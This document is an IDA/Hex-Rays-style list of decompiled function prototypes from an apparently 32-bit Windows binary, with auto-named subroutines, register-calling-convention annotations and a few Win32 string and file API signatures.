// int __usercall sub_1005A3FE@<eax>(void (__cdecl *a1)(int a1, unsigned int a2)@<eax>, int a2@<edx>, int a3@<ecx>, _BYTE *Src, char a5);
// int __usercall sub_1005A556@<eax>(int a1@<eax>, int a2@<ebx>, int a3);
// int __usercall sub_1005A70D@<eax>(int a1@<eax>, int a2@<ecx>, size_t a3@<ebx>, int a4, int a5);
int __cdecl sub_1005A7DD(int a1, unsigned __int8 a2);
// _DWORD *__usercall sub_1005A85A@<eax>(int a1@<esi>);
int __cdecl sub_1005A876(int a1, unsigned __int8 *a2, int a3, int a4, _DWORD *a5);
// void __usercall sub_1005AA4D(int *a1@<esi>);
// int __usercall sub_1005AA64@<eax>(int a1@<esi>);
// _DWORD *__usercall sub_1005AA80@<eax>(int a1@<esi>);
// int __usercall sub_1005AAB6@<eax>(int result@<eax>, int a2@<edx>);
// int __usercall sub_1005AB1C@<eax>(int a1@<esi>);
// int __usercall sub_1005AB66@<eax>(int a1@<eax>, char a2, int a3, int a4, int a5);
int __cdecl sub_1005ABB9(int a1, char a2);
// int __usercall sub_1005ABD1@<eax>(int a1@<eax>, char a2, int a3);
// int __usercall sub_1005ABE8@<eax>(int a1@<eax>, char a2, int a3, int a4);
int __cdecl sub_1005AC02(int *a1, char a2, int a3, int a4, int a5, unsigned __int16 *Src, _BYTE *a7);
int __cdecl sub_1005AC32(int *a1, char a2, int a3, int a4, int a5, unsigned __int16 *Src);
// int __usercall sub_1005AC63@<eax>(int a1@<eax>);
_DWORD *__fastcall sub_1005ACAF(int a1, int a2);
// _DWORD *__usercall sub_1005ACC5@<eax>(int a1@<esi>, _DWORD *a2);
// int __usercall sub_1005AD69@<eax>(_DWORD *a1@<eax>, int a2, int a3);
// int __usercall sub_1005ADFE@<eax>(int result@<eax>, int a2@<edx>, int a3@<ecx>);
int __fastcall sub_1005AE0E(int a1, char a2);
// int __usercall sub_1005AE20@<eax>(int result@<eax>, int a2@<edx>);
void __cdecl sub_1005AE32(int a1, int a2, unsigned int a3);
// void __usercall sub_1005AEE0(int a1@<eax>, unsigned int a2@<ebx>, int a3);
// void __usercall sub_1005AF29(_DWORD *a1@<esi>, int a2, int a3);
// int *__usercall sub_1005AF65@<eax>(int *result@<eax>, int a2@<ecx>, int a3);
// void __usercall sub_1005AFA8(int a1@<eax>, int *a2, unsigned __int16 *Src, _BYTE *a4);
// void *__usercall sub_1005B0D5@<eax>(int a1@<eax>, _DWORD *a2@<ecx>);
int *__fastcall sub_1005B0F6(int a1, int *a2);
// void __usercall sub_1005B11E(int a1@<eax>, unsigned int a2@<ecx>);
// void __usercall sub_1005B17B(int *a1@<ebx>);
// int __usercall sub_1005B1CA@<eax>(int result@<eax>, int a2@<ecx>, _DWORD *a3@<ebx>, int *a4@<edi>, unsigned int a5);
// int __usercall sub_1005B1ED@<eax>(int a1@<eax>, int a2, int a3, int a4, int a5, int a6, char a7);
// int __usercall sub_1005B3D0@<eax>(int result@<eax>, int a2@<edi>);
// int *__usercall sub_1005B409@<eax>(int **a1@<eax>);
// void __usercall sub_1005B44B(int a1@<eax>);
// _DWORD *__usercall sub_1005B4BC@<eax>(int a1@<edi>, int a2@<esi>);
// int __usercall sub_1005B518@<eax>(int a1@<eax>, int a2, int a3, _BYTE *Src, void (__cdecl *a5)(int a1, unsigned int a2));
// int __usercall sub_1005B54D@<eax>(int a1@<eax>, int *a2@<ecx>);
// void __usercall sub_1005B8E1(int a1@<esi>);
// int __usercall sub_1005B91A@<eax>(_DWORD *a1@<ebx>, int a2);
// int __usercall sub_1005B9E2@<eax>(int a1@<edi>);
// int __usercall sub_1005BA17@<eax>(int a1@<eax>, int a2);
int __cdecl sub_1005BA6D(int a1);
// int __usercall sub_1005BCA1@<eax>(int a1@<esi>);
// int __usercall sub_1005BD60@<eax>(unsigned int a1@<eax>);
// void __usercall sub_1005BD8A(int a1@<edi>, int a2);
// void __usercall sub_1005BDCB(unsigned int a1@<esi>);
// int __usercall sub_1005BE63@<eax>(int a1@<edi>);
// int __usercall sub_1005BF02@<eax>(int a1@<edx>, int a2);
// unsigned int __usercall sub_1005BFBE@<eax>(unsigned int a1@<eax>);
// size_t __usercall sub_1005BFD1@<eax>(int a1@<eax>, void *a2@<ebx>, int a3);
// unsigned int __usercall sub_1005C051@<eax>(int a1@<eax>, char *a2@<ecx>, int a3@<esi>);
// _DWORD *__usercall sub_1005C1FD@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4, unsigned __int8 *a5);
// void __usercall sub_1005C313(unsigned int a1@<esi>);
int __cdecl sub_1005C34E(int a1, unsigned __int8 *a2, int a3);
int __cdecl sub_1005C4E1(int a1, _DWORD *a2);
// int __usercall sub_1005C5B7@<eax>(int *a1@<esi>, int a2, int *a3);
// int __usercall sub_1005C640@<eax>(int a1@<eax>);
// _DWORD *__usercall sub_1005C654@<eax>(int a1@<eax>, int *a2@<ecx>);
int __thiscall sub_1005C69B(int this);
// _DWORD *__usercall sub_1005C6C7@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3, int a4, int a5);
// void __usercall sub_1005C78F(int a1@<edi>);
// void __usercall sub_1005C806(int a1@<eax>, char a2, unsigned __int8 a3);
int __cdecl sub_1005C850(unsigned int *a1);
int sub_10061294();
int sub_100612DC();
int __cdecl sub_100612F3(int a1);
int __cdecl sub_10061305(int a1);
int __cdecl sub_10061317(int a1);
void __cdecl sub_10061329(_DWORD *a1);
// int __usercall sub_100613B6@<eax>(char a1@<dl>, int a2@<ecx>, int a3);
// int __usercall sub_1006140B@<eax>(int a1@<ebx>, int a2@<edi>, unsigned __int8 a3);
// void __usercall sub_10061456(int a1@<ebx>);
// int __usercall sub_1006149E@<eax>(int *a1@<eax>, unsigned int a2);
// int __usercall sub_100614FA@<eax>(int a1@<esi>);
// int __usercall sub_10061587@<eax>(int a1@<eax>, int a2@<edi>, int a3);
// void __usercall sub_100615B9(int a1@<esi>);
// int __usercall sub_100615CB@<eax>(int a1@<eax>, unsigned __int8 *a2, __int64 a3, int a4, int *a5);
// int __usercall sub_10061630@<eax>(int a1@<esi>);
// unsigned int __usercall sub_1006166F@<eax>(int a1@<edi>, int a2);
// void __usercall sub_100616A8(int a1@<eax>, int *a2@<ecx>, char a3, int a4, int *a5);
// int __usercall sub_1006175A@<eax>(int a1@<eax>, int *a2@<ecx>, _BYTE *a3, int *a4);
// int __usercall sub_100617C9@<eax>(int a1@<ebx>, _BYTE *a2, int a3);
// int __usercall sub_100618E4@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>);
// unsigned int __usercall sub_1006190B@<eax>(int a1@<eax>, int a2);
// void __usercall sub_100619BB(int *a1@<edi>, int a2@<esi>, int a3);
// int __usercall sub_100619FC@<eax>(int a1@<esi>);
// int __usercall sub_10061B37@<eax>(int a1@<eax>, int a2, int *a3);
// int __usercall sub_10061C73@<eax>(int a1@<eax>, int a2, __int16 a3);
// int __usercall sub_10061DF8@<eax>(int a1@<eax>, int a2@<ecx>);
// int __usercall sub_10061E53@<eax>(int a1@<edi>);
// __int16 __usercall sub_10061FAA@<ax>(int a1@<esi>, int a2);
// int __usercall sub_10062040@<eax>(int a1@<edx>, int *a2@<ecx>, int a3);
// int __usercall sub_10062069@<eax>(int *a1@<esi>, unsigned int a2, int *a3, int a4);
// int __usercall sub_100620A9@<eax>(int *a1@<eax>);
// int __usercall sub_100620C4@<eax>(int *a1@<eax>, int *a2@<ebx>, unsigned int a3);
// void __usercall sub_100620FB(int a1@<eax>);
int __cdecl sub_10062108(int a1);
int __cdecl sub_10062129(int a1);
int __cdecl sub_10062164(char *Str1, int a2, int *a3, int a4, int a5);
// int __usercall sub_10062507@<eax>(int *a1@<esi>);
// int __usercall sub_1006256A@<eax>(int a1@<eax>);
// int __usercall sub_10062612@<eax>(int a1@<eax>, int a2@<ebx>);
// int __usercall sub_10062646@<eax>(int a1@<eax>, int a2, int a3);
// int __usercall sub_100626A1@<eax>(int a1@<eax>, int a2, int a3, int a4);
// int __usercall sub_10062735@<eax>(int a1@<eax>, char a2);
// int __usercall sub_10062784@<eax>(int a1@<eax>);
// int __usercall sub_100627B1@<eax>(int a1@<eax>);
// void __usercall sub_1006294A(int a1@<esi>);
// int __usercall sub_10062963@<eax>(int a1@<ebx>);
// int __usercall sub_10062A0B@<eax>(int a1@<eax>, int a2);
// int __usercall sub_10062B85@<eax>(int a1@<eax>);
// int __usercall sub_10062C46@<eax>(int a1@<eax>, int a2, int a3, char a4);
// int __usercall sub_10062D4C@<eax>(int a1@<eax>, int *a2@<ecx>, int a3@<ebx>, char a4, unsigned int a5, int a6);
// int __usercall sub_10062E31@<eax>(int a1@<eax>, unsigned int a2, int a3);
// int __usercall sub_10062FDF@<eax>(int a1@<eax>);
// int __usercall sub_10063019@<eax>(int a1@<eax>);
// int __usercall sub_1006313A@<eax>(int a1@<eax>, char *a2);
// void __usercall sub_1006318E(int a1@<eax>);
// int __usercall sub_100631FC@<eax>(int a1@<eax>);
// int __usercall sub_10063238@<eax>(int a1@<eax>);
int __cdecl sub_10063268(int a1, int a2);
// int __usercall sub_100632C4@<eax>(int a1@<ebx>);
// int __usercall sub_10063337@<eax>(int a1@<eax>, int a2);
// int __usercall sub_10063373@<eax>(int a1@<eax>, int a2, int a3);
// int __usercall sub_100633BB@<eax>(int a1@<eax>, int a2@<ebx>, int a3, int a4, int a5);
_DWORD *__cdecl sub_10063439(int a1, int a2);
// int __usercall sub_1006345E@<eax>(int a1@<eax>);
// int __usercall sub_100634DB@<eax>(int a1@<esi>);
// int __usercall sub_10063501@<eax>(int a1@<eax>, _DWORD *a2@<edi>);
// int __usercall sub_10063527@<eax>(int a1@<eax>, unsigned int a2, _DWORD *a3, unsigned int *a4);
// int __usercall sub_100635F1@<eax>(unsigned int a1@<eax>, int a2@<ecx>, size_t a3, char *a4);
// int __usercall sub_10063776@<eax>(int a1@<eax>, int a2, size_t a3, char *a4);
// int __usercall sub_100637A4@<eax>(int a1@<esi>, _DWORD *a2, int a3);
// int __usercall sub_100637FB@<eax>(int a1@<esi>, unsigned int a2);
// void __usercall sub_1006385B(int a1@<esi>);
// int __usercall sub_10063878@<eax>(int a1@<eax>);
// int __usercall sub_10063962@<eax>(int a1@<eax>);
// int __usercall sub_100639B3@<eax>(int a1@<eax>);
// int __usercall sub_10063A10@<eax>(int a1@<edi>, _DWORD *a2@<esi>);
// int __usercall sub_10063A35@<eax>(_DWORD *a1@<edi>, int a2@<esi>);
int __cdecl sub_10063A72(int a1, int a2, __int64 a3, int a4, int *a5);
int __cdecl sub_10063D40(int a1, _DWORD *a2);
int __cdecl sub_10063E4D(int a1, _DWORD *a2);
int __cdecl sub_10063F4D(int a1, int *a2, int *a3, unsigned int a4, char a5);
// int __usercall sub_10064437@<eax>(int *a1@<eax>, int *a2@<edi>, unsigned int a3);
// int __usercall sub_10064625@<eax>(int result@<eax>, int *a2@<esi>);
// int __usercall sub_1006463B@<eax>(int a1@<eax>, int a2);
// int __usercall sub_100646FC@<eax>(int a1@<eax>, int Size, void *a3, signed __int64 a4, void *a5, int a6, int a7, _DWORD *a8);
// char __usercall sub_1006491B@<al>(int a1@<esi>, int a2, int a3, int *a4);
// void __usercall sub_100649BE(_BYTE *a1@<eax>, int a2@<ecx>, int a3, int a4, int a5, int a6, int *a7);
// int __usercall sub_10064B22@<eax>(int a1@<esi>, int a2, int a3, int a4);
// int __usercall sub_10064BC8@<eax>(int a1@<ebx>, int a2, int a3);
// int __usercall sub_10064D0D@<eax>(int a1@<eax>, int a2, int *a3);
// int __usercall sub_10064DB0@<eax>(int a1@<eax>, int a2, int a3, int a4);
// int __usercall sub_1006570A@<eax>(int a1@<eax>, int *a2);
int __cdecl sub_100657DA(int a1);
// int __usercall sub_10065921@<eax>(int a1@<eax>, int a2@<ebx>, void *a3, signed __int64 a4, void *a5, int a6, int a7, int a8);
// int __usercall sub_10065AD2@<eax>(int a1@<ebx>);
int __cdecl sub_10065CC1(int a1, unsigned int *a2, int a3);
// int __usercall sub_10065E71@<eax>(int a1@<eax>, unsigned int *a2, int a3);
int __cdecl sub_10065E9B(int *a1, unsigned int a2, int a3, _DWORD *a4);
// int __usercall sub_10065FB3@<eax>(int a1@<ebx>, unsigned int a2, _DWORD *a3);
int __cdecl sub_10065FF4(int a1, unsigned int a2, unsigned int *a3);
// int __usercall sub_1006618B@<eax>(int a1@<eax>, int a2, int *a3);
// int __usercall sub_100661BB@<eax>(int a1@<ebx>, int a2, int a3);
// int __usercall sub_10066209@<eax>(int a1@<eax>, _QWORD *a2);
// void __usercall sub_100662EC(int a1@<esi>, _BYTE *a2, char *a3, ...);
// int __usercall sub_10066355@<eax>(int a1@<eax>, unsigned int a2@<ecx>, _BYTE *a3);
// void __usercall sub_100663A7(int a1@<eax>, int a2, unsigned __int8 a3, int a4, _BYTE *a5);
// void __usercall sub_10066423(int a1@<eax>, int *a2@<ecx>, int a3, int a4, _BYTE *a5);
int __cdecl sub_100665AF(int a1, unsigned int a2, _BYTE *a3);
int __cdecl sub_100669D1(int a1, int a2, int a3, int a4, _DWORD *a5);
// BOOL __usercall sub_10066C14@<eax>(int a1@<eax>);
// int __usercall sub_10066C25@<eax>(int a1@<eax>, size_t Size, int a3);
// int __usercall sub_10066C60@<eax>(char a1@<al>, int a2@<edx>, int a3@<ecx>);
// void __usercall sub_10066CAA(int a1@<edx>, int *a2@<ecx>, int a3);
// int __usercall sub_10066CED@<eax>(int a1@<edi>);
// void __usercall sub_10066D54(_DWORD *a1@<esi>);
// void __usercall sub_10066D9D(int a1@<eax>);
// int __usercall sub_10066DBF@<eax>(int a1@<edi>);
// int __usercall sub_10066DE3@<eax>(_DWORD *a1@<esi>);
// int __usercall sub_10066E01@<eax>(int a1@<esi>);
// _DWORD *__usercall sub_10066EC6@<eax>(_DWORD *result@<eax>);
// _DWORD *__usercall sub_10066F21@<eax>(_DWORD *a1@<esi>);
int sub_10066F45();
// unsigned int __usercall sub_10066F7E@<eax>(_DWORD *a1@<ebx>, unsigned int a2);
// int __usercall sub_10066FD0@<eax>(int a1@<edi>, int a2@<esi>);
void *sub_10067012();
_DWORD *__cdecl sub_10067024(int a1, int a2);
int __cdecl sub_10067086(int a1, int a2);
int __cdecl sub_100670C4(int a1);
char *__cdecl sub_100670EB(_DWORD *a1, unsigned int a2, int a3);
int __cdecl sub_1006728A(_DWORD *a1, int a2, int a3);
int __cdecl sub_100672F9(_DWORD *a1, int a2, unsigned int a3, unsigned int a4);
int __cdecl sub_10067368(_DWORD *a1, unsigned int a2);
void __cdecl sub_1006739F(_DWORD *a1);
// int __usercall sub_100673EE@<eax>(int a1@<esi>);
// int __usercall sub_100673FF@<eax>(int a1@<eax>, int a2, int a3, int a4, int a5);
// int __usercall sub_10067419@<eax>(int a1@<eax>, int a2, int a3, int a4, int a5);
// int __usercall sub_10067433@<eax>(int a1@<eax>, int a2, int a3);
// int __usercall sub_10067447@<eax>(int a1@<eax>, int a2);
// int __usercall sub_10067457@<eax>(__int16 a1@<ax>, int a2@<ecx>, int a3, int a4, int a5);
// int __usercall sub_10067472@<eax>(int a1@<edi>, int a2, int *a3);
// int __usercall sub_100674B8@<eax>(int a1@<eax>);
// int __usercall sub_100674CF@<eax>(int a1@<edi>, int a2@<esi>, char *Str1);
void __fastcall sub_10067528(int a1, int a2);
// int __usercall sub_10067565@<eax>(int a1@<esi>);
int __cdecl sub_100675A0(_DWORD *a1, int a2, int a3);
int __cdecl sub_10067632(int a1, int a2, int a3);
__int16 __cdecl sub_10067681(int a1, int a2, int *a3);
__int16 __cdecl sub_100676F3(int a1, int a2, int *a3);
void __cdecl sub_1006777F(int a1, int a2, int *a3);
void __cdecl sub_100679DD(int a1, int a2, int *a3);
// int __usercall sub_10067A76@<eax>(int a1@<eax>, __int64 a2);
_BYTE *__cdecl sub_10067AB7(int a1, int a2, int *a3);
_BYTE *__cdecl sub_10067B44(int a1, int a2, int *a3);
int __cdecl sub_10067BC1(int a1);
char *__cdecl sub_10067C0C(int a1, int a2, int *a3);
int __cdecl sub_10067C5E(int a1);
int __cdecl sub_10067C7B(int a1);
int __cdecl sub_10067C8D(int a1);
BOOL __cdecl sub_10067C9F(_BYTE *a1, unsigned __int8 *a2, _BYTE *a3, int a4);
unsigned __int8 *__cdecl sub_10067FB3(_DWORD *a1, int a2, int *a3);
int __cdecl sub_10068067(int a1, int a2, int *a3);
int __cdecl sub_10068094(int a1);
int __cdecl sub_100680C2(int a1);
void __cdecl sub_100680F0(int a1, int a2, int *a3);
_BYTE *__cdecl sub_10068289(int a1, int a2, int *a3);
void *__cdecl sub_10068317(int a1, int a2, int *a3);
void __cdecl sub_10068358(int a1, int a2, int *a3);
unsigned __int8 *__cdecl sub_10068550(int a1, int a2, int *a3);
void __cdecl sub_10068731(_DWORD *a1, int a2, int *a3);
__int16 __cdecl sub_10068806(_DWORD *a1);
__int16 __cdecl sub_10068867(_DWORD *a1);
__int16 __cdecl sub_100688B1(_DWORD *a1);
_QWORD *__cdecl sub_100688E1(_DWORD *a1, int a2, int a3);
int __cdecl sub_1006890F(_DWORD *a1);
int __cdecl sub_10068941(_DWORD *a1, int a2, int *a3);
int *__cdecl sub_100689A4(_DWORD *a1);
void __cdecl sub_100689D4(_DWORD *a1, int a2, int *a3);
int __cdecl sub_10068A69(_DWORD *a1);
// int __usercall sub_10068AB6@<eax>(int a1@<esi>);
_DWORD *__cdecl sub_10068B1B(int a1, unsigned __int8 *Src, char a3);
// _DWORD *__usercall sub_10068B49@<eax>(_DWORD *a1@<ebx>, int a2);
_DWORD *sub_10068BD7();
// int __usercall sub_10068C0F@<eax>(int a1@<esi>);
// int __usercall sub_10068C28@<eax>(int a1@<esi>);
// void __usercall sub_10068C39(int a1@<edi>);
// int __usercall sub_10068CA7@<eax>(int result@<eax>);
int __cdecl sub_10068CBC(int a1);
// int __usercall sub_10068D45@<eax>(int a1@<edi>);
// int *__usercall sub_10068D82@<eax>(int *result@<eax>, int a2@<esi>);
// int __usercall sub_10068DD3@<eax>(int *a1@<edi>);
// void __usercall sub_10068E02(_DWORD *a1@<esi>);
int __cdecl sub_10068E33(int a1);
// _DWORD *__usercall sub_10068E5E@<eax>(_DWORD *result@<eax>, _DWORD *a2@<edx>, int a3@<esi>);
// int __usercall sub_10068EB0@<eax>(int a1@<eax>, unsigned int *a2@<ecx>);
// int **__usercall sub_10068F5C@<eax>(_DWORD *a1@<ecx>, int a2@<ebx>, unsigned __int8 *a3, int a4);
// void __usercall sub_10068FA8(_DWORD *a1@<eax>, _DWORD *a2@<ecx>, int a3);
// int *__usercall sub_10068FF9@<eax>(int a1@<eax>, _DWORD *a2@<esi>, unsigned __int8 *a3);
// int *__usercall sub_10069032@<eax>(unsigned int *a1@<eax>, unsigned __int8 *a2@<edi>, int a3, int *a4);
int (*sub_10069106())(void);
int (*sub_10069112())(void);
// _DWORD *__usercall sub_1006911E@<eax>(_DWORD *result@<eax>);
// int __usercall sub_100691BB@<eax>(int a1@<esi>, int a2, int a3, _DWORD *a4);
// int __usercall sub_100692F6@<eax>(int result@<eax>);
// int __usercall sub_10069323@<eax>(_DWORD *a1@<eax>);
int *__thiscall sub_1006934E(int this);
// _DWORD *__usercall sub_10069369@<eax>(_DWORD *result@<eax>);
// int *__usercall sub_10069389@<eax>(int a1@<edi>, int a2@<esi>);
// int __usercall sub_100693BB@<eax>(int result@<eax>, int a2@<esi>);
// int __usercall sub_10069408@<eax>(int a1@<eax>, int a2@<edx>);
// int __usercall sub_1006944A@<eax>(int a1@<eax>);
// void __usercall sub_100694C8(int a1@<eax>, int a2, _BYTE *Src);
// int __usercall sub_10069560@<eax>(_DWORD *a1@<edi>, int a2);
// int *__usercall sub_100695A6@<eax>(int *a1@<eax>, int a2@<ebx>, unsigned __int8 a3, _BYTE *Src);
// int *__usercall sub_1006960E@<eax>(int a1@<ebx>, _BYTE *Src, int a3);
// int *__usercall sub_10069699@<eax>(int a1@<eax>, unsigned __int8 a2, _BYTE *Src, int a4);
// int __usercall sub_100696C9@<eax>(__int16 *a1@<ecx>, int a2@<esi>, char a3);
// int __usercall sub_10069726@<eax>(int a1@<eax>, int a2@<ecx>, int a3@<ebx>, unsigned __int8 *a4);
// _DWORD *__usercall sub_10069759@<eax>(int a1@<esi>, int a2);
// _DWORD *__usercall sub_100697AC@<eax>(size_t Size@<ecx>, int a2@<eax>, int a3, unsigned __int8 *Src, char a5, int a6);
void __cdecl sub_100698C8(_DWORD *a1);
// _DWORD *__usercall sub_10069973@<eax>(int a1@<eax>, int a2);
// char __usercall sub_100699DD@<al>(int a1@<edi>, int a2@<esi>);
// int __usercall sub_10069AB6@<eax>(char *a1@<eax>, int a2);
// int __usercall sub_10069AEC@<eax>(int a1@<eax>, int a2@<ebx>, int a3, char a4, int a5);
// int *__usercall sub_10069B97@<eax>(int *a1@<eax>);
// int *__usercall sub_10069BE9@<eax>(int *result@<eax>);
// void __usercall sub_10069DB8(int a1@<edi>, char *a2, ...);
// int *__usercall sub_10069E40@<eax>(int a1@<edi>, unsigned __int8 *a2, unsigned __int8 *a3);
int *__cdecl sub_10069EB7(int a1, int a2, unsigned __int8 *a3, unsigned __int8 *a4);
int *__cdecl sub_10069F30(unsigned __int8 *a1, unsigned __int8 *a2);
// void __usercall sub_10069FA1(unsigned int a1@<esi>);
// void __usercall sub_10069FBC(unsigned __int8 *a1@<ecx>, int a2@<ebx>);
// void __usercall sub_1006A029(int a1@<eax>, _DWORD *a2@<ebx>);
// void __usercall sub_1006A14E(int *a1@<edi>);
void __cdecl sub_1006A1BB(unsigned int a1);
// int __usercall sub_1006A297@<eax>(int a1@<eax>, int a2@<ecx>);
// void __usercall sub_1006A2B6(int *a1@<eax>, int a2);
int __cdecl sub_1006A313(unsigned __int8 *a1);
// int __usercall sub_1006A35E@<eax>(int a1@<eax>, int *a2@<edx>, int *a3@<ecx>, int a4);
// int __usercall sub_1006A3D4@<eax>(int a1@<eax>, _BYTE *a2);
// void __usercall sub_1006A41E(int a1@<eax>, int a2@<ecx>, int a3, int a4, int a5, int a6, int a7);
void __cdecl sub_1006A6E3(int *a1, int a2);
char __fastcall sub_1006A7EB(int a1, _BYTE *a2);
// void __usercall sub_1006A872(int *a1@<eax>, int a2@<ebx>);
void __cdecl sub_1006A905(int a1, int *a2, int a3, int a4, int a5);
// void __usercall sub_1006AA62(int a1@<eax>, _DWORD *a2);
void __cdecl sub_1006AA9A(int *a1, int a2);
// int *__usercall sub_1006AB10@<eax>(int *a1@<eax>, char *Src);
// int __usercall sub_1006AB7A@<eax>(_DWORD *a1@<esi>, int a2);
// _DWORD *__usercall sub_1006ABCC@<eax>(unsigned __int8 *a1@<eax>, int a2, _DWORD *a3);
// _BYTE *__usercall sub_1006AC5B@<eax>(int a1@<ebx>, int a2);
int *__cdecl sub_1006ADD2(int a1, _DWORD *a2, _DWORD *a3, _DWORD **a4);
// void __usercall sub_1006B0BD(int *a1@<eax>, int *a2, int a3, int a4, unsigned int a5, int a6, int a7);
int __cdecl sub_1006B423(int *a1, int a2);
// int __usercall sub_1006B518@<eax>(int a1@<eax>, int a2);
// int __usercall sub_1006B563@<eax>(int a1@<eax>, int *a2@<ecx>, int a3);
// int __usercall sub_1006B5CF@<eax>(_DWORD *a1@<edi>, int *a2);
void __cdecl sub_1006B62B(int *a1, int a2, int a3, int a4);
// void __usercall sub_1006B82C(int a1@<eax>, int a2, int *a3, int *a4, __int16 a5);
// int __usercall sub_1006BAD2@<eax>(int a1@<eax>, char a2);
// int *__usercall sub_1006BAEE@<eax>(int *a1@<eax>, int a2, int a3);
// int __usercall sub_1006BC68@<eax>(int a1@<eax>, int *a2, int a3, int a4, int *a5, int a6, int a7, _DWORD *a8, char a9, int a10);
int __fastcall sub_1006C389(int a1, int a2);
void __cdecl sub_1006C3C7(int a1, int a2, int a3);
// _DWORD *__usercall sub_1006C503@<eax>(_DWORD *a1@<eax>, int a2@<ecx>, int *a3@<edi>, int *a4@<esi>, int a5, signed int Size, int *a7);
// unsigned int *__usercall sub_1006C56B@<eax>(unsigned int *a1@<eax>, int a2, int a3);
// void __usercall sub_1006C5DA(unsigned int *a1@<esi>, int a2);
// int __usercall sub_1006C617@<eax>(int a1@<eax>, unsigned __int8 *a2);
// __int16 *__usercall sub_1006C653@<eax>(__int16 *a1@<eax>, int a2, int a3, int a4);
// __int16 *__usercall sub_1006C71D@<eax>(__int16 *a1@<eax>, int a2@<edi>, int a3, _DWORD *a4);
void __cdecl sub_1006C7A7(int a1, __int16 *a2);
// void __usercall sub_1006C7F7(__int16 *a1@<ebx>, int a2);
// __int16 *__usercall sub_1006C893@<eax>(__int16 *a1@<eax>, int *a2@<ecx>, int a3, _DWORD *a4, int a5, unsigned int a6, unsigned int a7, unsigned int *a8);
// _DWORD *__usercall sub_1006C93D@<eax>(_DWORD *result@<eax>, __int16 *a2@<ecx>, int *a3);
// void __usercall sub_1006C978(__int16 *a1@<esi>);
// int *__usercall sub_1006C9A6@<eax>(int *a1@<eax>, int a2);
// void __usercall sub_1006CA0C(int a1@<eax>, int *a2@<ecx>, int a3);
// int __usercall sub_1006CA50@<eax>(int a1@<eax>);
// int __usercall sub_1006CAC0@<eax>(int *a1@<eax>, int a2@<esi>);
// char __usercall sub_1006CB39@<al>(int *a1@<eax>, char a2@<cl>, char a3);
_DWORD *__thiscall sub_1006CB6D(_DWORD *this);
// int __usercall sub_1006CB81@<eax>(int *a1@<eax>, int a2, unsigned __int16 *a3, _BYTE *a4);
unsigned int __cdecl sub_1006CBB6(int *a1, _DWORD *a2);
// int __usercall sub_1006CC49@<eax>(int a1@<eax>);
int __cdecl sub_1006CC90(int a1, int a2, int a3, int *a4);
int __cdecl sub_1006CCC4(int a1, int a2, int a3);
// int __usercall sub_1006CCE6@<eax>(int a1@<edi>, _BYTE *a2, unsigned int a3);
// int __usercall sub_1006CDFD@<eax>(_DWORD *a1@<eax>);
// int __usercall sub_1006CE44@<eax>(int a1@<esi>, int a2);
// int __usercall sub_1006CEF8@<eax>(int a1@<esi>);
// int __usercall sub_1006D020@<eax>(int a1@<eax>, int a2, unsigned int a3, unsigned int a4, int *a5, int *a6);
// int __usercall sub_1006D1B6@<eax>(int a1@<esi>, char *a2);
int __cdecl sub_1006D326(int a1, int a2);
// void __usercall sub_1006D34A(int a1@<edi>);
// int __usercall sub_1006D378@<eax>(int a1@<edi>);
// int __usercall sub_1006D3C9@<eax>(unsigned int a1@<edi>, int a2@<esi>);
// void __usercall sub_1006D405(int a1@<eax>);
// int __usercall sub_1006D466@<eax>(int result@<eax>, int a2);
// void __usercall sub_1006D483(int a1@<esi>);
// int __usercall sub_1006D4A7@<eax>(_DWORD *a1@<eax>, int a2);
int __cdecl sub_1006D5D4(int a1);
// int __usercall sub_1006D5FB@<eax>(int a1@<eax>, int *a2@<esi>, int a3, int a4, int a5, unsigned int *a6);
// int __usercall sub_1006D831@<eax>(int *a1@<eax>, char *Str2);
// int __usercall sub_1006D9E3@<eax>(int a1@<esi>, unsigned int a2);
// _DWORD *__usercall sub_1006DA69@<eax>(int a1@<esi>);
// int __usercall sub_1006DAA3@<eax>(unsigned int *a1@<ebx>, _BYTE *a2);
int __cdecl sub_1006DCF2(_DWORD *a1, _DWORD *a2);
// int __usercall sub_1006DEE6@<eax>(int a1@<ebx>, unsigned __int16 *a2, int a3);
int __cdecl sub_1006DFA2(int, void *); // idb
// int __usercall sub_1006DFE2@<eax>(_DWORD *a1@<edi>, int a2@<esi>);
// int __usercall sub_1006E07D@<eax>(int a1@<ebx>, int a2@<esi>);
// int __usercall sub_1006E0B9@<eax>(int a1@<eax>);
// int __usercall sub_1006E128@<eax>(int a1@<eax>);
int __cdecl sub_1006E26C(int a1);
// int __usercall sub_1006E342@<eax>(int *a1@<ebx>);
int __cdecl sub_1006E3AB(int a1, int a2);
// int __usercall sub_1006E459@<eax>(unsigned int a1@<eax>, int a2@<ecx>, int *a3, char *Str1, int a5);
// int __usercall sub_1006E76C@<eax>(int *a1@<eax>, _DWORD *a2);
// int __usercall sub_1006E88D@<eax>(int *a1@<esi>);
int __cdecl sub_1006E907(int a1);
void __cdecl sub_1006EB41(int a1);
// int __usercall sub_1006EB74@<eax>(int a1@<ebx>, unsigned int a2, _DWORD *a3, int a4);
// void __usercall sub_1006EC75(int a1@<eax>);
int __thiscall sub_1006EC95(int this);
// int __usercall sub_1006ECD4@<eax>(int a1@<ebx>);
// int __usercall sub_1006ED9F@<eax>(int a1@<eax>, int a2, char a3);
int __cdecl sub_1006EE12(int a1);
int __cdecl sub_1006EFC8(int a1);
// int __usercall sub_1006F196@<eax>(int a1@<eax>);
// int __usercall sub_1006F1F2@<eax>(int a1@<eax>, char *a2, int a3);
// int __usercall sub_1006F395@<eax>(int a1@<esi>);
// int __usercall sub_1006F3D2@<eax>(int a1@<eax>);
// int __usercall sub_1006F459@<eax>(int a1@<esi>, int a2);
// int __usercall sub_1006F519@<eax>(int a1@<esi>, int a2, int a3);
// int __usercall sub_1006F5BD@<eax>(int a1@<eax>, int a2, int a3, int a4);
// int __usercall sub_1006F6DE@<eax>(int a1@<ebx>, int a2@<edi>);
BOOL sub_1006F71E();
WCHAR *__cdecl sub_1006F767(LPCCH lpMultiByteStr);
CHAR *__cdecl sub_1006F7BE(LPCWCH lpWideCharStr);
CHAR *__cdecl sub_1006F81C(LPCWCH lpWideCharStr);
CHAR *__cdecl sub_1006F882(LPCCH lpMultiByteStr);
int __cdecl sub_1006F8FD(int a1);
int __cdecl sub_1006F936(DWORD NumberOfBytesRead, char *lpBuffer, DWORD nNumberOfBytesToRead, LONG lDistanceToMove, int a5);
